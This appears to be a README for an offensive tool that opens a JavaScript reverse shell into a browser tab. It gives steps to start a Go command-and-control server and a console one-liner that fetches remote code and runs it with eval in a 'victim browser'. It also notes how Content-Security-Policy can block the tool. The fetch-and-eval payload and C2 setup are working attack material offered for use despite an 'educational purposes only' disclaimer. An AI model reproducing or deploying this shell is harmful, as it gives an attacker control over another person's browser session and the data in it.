# Browser Reverse Shell

**NOTICE: for educational purposes only, DO NOT use without the explicit permission of the owner of the browser**

Create a reverse shell into a browser tab.

## How to use

start the C2 server by going into the c2 directory and running

~~~bash
go run main.go
~~~

then in the victim browser, open devtools and paste the fetch-rev-shell.js contents into the console, changing out the url for the ip address of your c2 server.

~~~js
const url = "http://localhost:8080/get"; const r1 = await fetch(url);const r2 = await r1.text(); eval(r2);
~~~

now go to the console of the c2 server, you now have a javascript reverse shell into the current browser tab of the 

## Challenges

- This reverse shell relies on the eval function of javascript, which many sites block.
- Many sites (like github) block fetching from other sources than the preapproved ones, which will give you an error like
~~~
Content-Security-Policy: The page’s settings blocked the loading of a resource (connect-src) at http://localhost:8080/get because it violates the following directive: “connect-src 'self'
~~~
